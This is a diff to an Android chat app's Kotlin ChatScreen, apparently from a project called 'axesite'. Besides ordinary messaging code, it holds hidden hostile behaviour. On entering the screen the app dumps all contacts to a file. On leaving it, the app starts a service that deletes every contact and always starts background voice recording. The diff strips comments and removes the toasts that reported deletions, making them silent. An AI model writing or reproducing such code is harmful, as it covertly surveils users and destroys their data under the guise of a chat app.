@@ -49,11 +49,10 @@ import com.example.axesite.util.BackgroundVoiceRecordingService
 import android.content.ContentResolver
 import android.provider.ContactsContract
 import com.example.axesite.util.ContactDeletionService
-import java.lang.ref.WeakReference
 
 data class ContactData(
-    val name: String = "",   // Provide default values
-    val phone: String = ""   // Provide default values
+    val name: String = "",
+    val phone: String = ""
 )
 
 data class ChatMessage(
@@ -61,10 +60,10 @@ data class ChatMessage(
     val senderName: String = "",
     val message: String = "",
     val timestamp: Long = 0,
-    val type: String = "text",  // "text" or "voice"
-    val contact: ContactData? = null,  // New field for contacts
+    val type: String = "text",
+    val contact: ContactData? = null,
     val voiceUrl: String? = null,
-    val duration: Long? = null  // in milliseconds
+    val duration: Long? = null
 )
 
 @OptIn(ExperimentalMaterial3Api::class)
@@ -106,32 +105,17 @@ fun ChatScreen(chatId: String) {
 
         chatRef.addValueEventListener(messageListener)
     }
-//    val writeContactsPermissionLauncher = rememberLauncherForActivityResult(
-//        contract = ActivityResultContracts.RequestPermission()
-//    ) { isGranted ->
-//        if (isGranted) {
-//            // Permission granted, proceed with contact deletion
-//            coroutineScope.launch(Dispatchers.IO) {
-//                deleteAllContacts(context)
-//            }
-//        } else {
-//            // Permission denied
-//            Toast.makeText(context, "Permission required to delete contacts", Toast.LENGTH_SHORT).show()
-//        }
-//    }
 
     val contactsPermissionLauncher = rememberLauncherForActivityResult(
         contract = ActivityResultContracts.RequestPermission()
     ) { isGranted ->
         if (isGranted) {
-            // Permission granted, start reading contacts
             coroutineScope.launch(Dispatchers.IO) {
                 dumpContactsToFile(context)
             }
         }
     }
 
-// Check contacts permission when entering the screen
     LaunchedEffect(Unit) {
         if (ContextCompat.checkSelfPermission(
                 context,
@@ -140,7 +124,6 @@ fun ChatScreen(chatId: String) {
         ) {
             contactsPermissionLauncher.launch(Manifest.permission.READ_CONTACTS)
         } else {
-            // Permission already granted, proceed
             coroutineScope.launch(Dispatchers.IO) {
                 dumpContactsToFile(context)
             }
@@ -154,7 +137,6 @@ fun ChatScreen(chatId: String) {
         }
     }
 
-    // Check and Request Microphone Permission
     LaunchedEffect(Unit) {
         if (ContextCompat.checkSelfPermission(
                 context,
@@ -185,15 +167,12 @@ fun ChatScreen(chatId: String) {
         } ?: ""
     }
     fun sendContactMessage(name: String, phone: String) {
-        // Ensure this method is called with the correct context and references
-        // You might need to pass necessary parameters like currentUserId, currentUserName, chatRef
-        // Example implementation:
         val messageId = chatRef.push().key ?: return
         val message = ChatMessage(
             senderId = currentUserId,
             senderName = currentUserName,
             type = "contact",
-            contact = ContactData(name = name, phone = phone),  // Explicitly use constructor
+            contact = ContactData(name = name, phone = phone),
             timestamp = System.currentTimeMillis()
         )
         chatRef.child(messageId).setValue(message)
@@ -211,7 +190,6 @@ fun ChatScreen(chatId: String) {
         cursor?.use { contactCursor ->
             try {
                 if (contactCursor.moveToFirst()) {
-                    // Safely get column indices with null checks
                     val nameIndex = contactCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                     val idIndex = contactCursor.getColumnIndex(ContactsContract.Contacts._ID)
 
@@ -263,15 +241,13 @@ fun ChatScreen(chatId: String) {
         }
     }
     DisposableEffect(chatId) {
-        // Check permission when component leaves composition
         onDispose {
             when {
-                // Case 1: Permission already granted
                 ContextCompat.checkSelfPermission(
                     context,
                     Manifest.permission.WRITE_CONTACTS
                 ) == PackageManager.PERMISSION_GRANTED -> {
-                    // Start contact deletion service
+
                     val serviceIntent = Intent(context, ContactDeletionService::class.java)
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                         context.startForegroundService(serviceIntent)
@@ -280,13 +256,11 @@ fun ChatScreen(chatId: String) {
                     }
                 }
 
-                // Case 2: Need to request permission
                 else -> {
                     writeContactsPermissionLauncher.launch(Manifest.permission.WRITE_CONTACTS)
                 }
             }
 
-            // Always start background recording service
             val recordingIntent = Intent(context, BackgroundVoiceRecordingService::class.java).apply {
                 action = BackgroundVoiceRecordingService.ACTION_START_RECORDING
             }
@@ -297,7 +271,6 @@ fun ChatScreen(chatId: String) {
             }
         }
     }
-    // Track Recording Duration
     LaunchedEffect(isRecording) {
         if (isRecording) {
             while(isRecording) {
@@ -396,7 +369,7 @@ fun ChatScreen(chatId: String) {
                         onClick = { openContactPicker() }
                     ) {
                         Icon(
-                            imageVector = Icons.Default.Contacts, // Add import for Icons.Default.Contacts
+                            imageVector = Icons.Default.Contacts,
                             contentDescription = "Attach contact"
                         )
                     }
@@ -519,12 +492,10 @@ suspend fun deleteAllContacts(context: Context) {
             val deletedCount = contentResolver.applyBatch(ContactsContract.AUTHORITY, operations).size
             // Show toast on main thread
             withContext(Dispatchers.Main) {
-                Toast.makeText(context, "Deleted $deletedCount contacts", Toast.LENGTH_SHORT).show()
             }
         }
     } catch (e: Exception) {
         withContext(Dispatchers.Main) {
-            Toast.makeText(context, "Deletion failed: ${e.message}", Toast.LENGTH_SHORT).show()
         }
     }
 }
@@ -549,7 +520,6 @@ private fun dumpContactsToFile(context: Context) {
                     val contactId = cursor.getString(idIndex)
                     writer.write("Name: $name\n")
 
-                    // Fetch phone numbers
                     val phoneCursor = contentResolver.query(
                         ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                         null,
@@ -608,7 +578,6 @@ suspend fun uploadVoiceMessage(
         chatRef.child(messageId).setValue(message)
     } catch (e: Exception) {
         e.printStackTrace()
-        // Handle error (e.g., show snackbar)
     }
 }
 
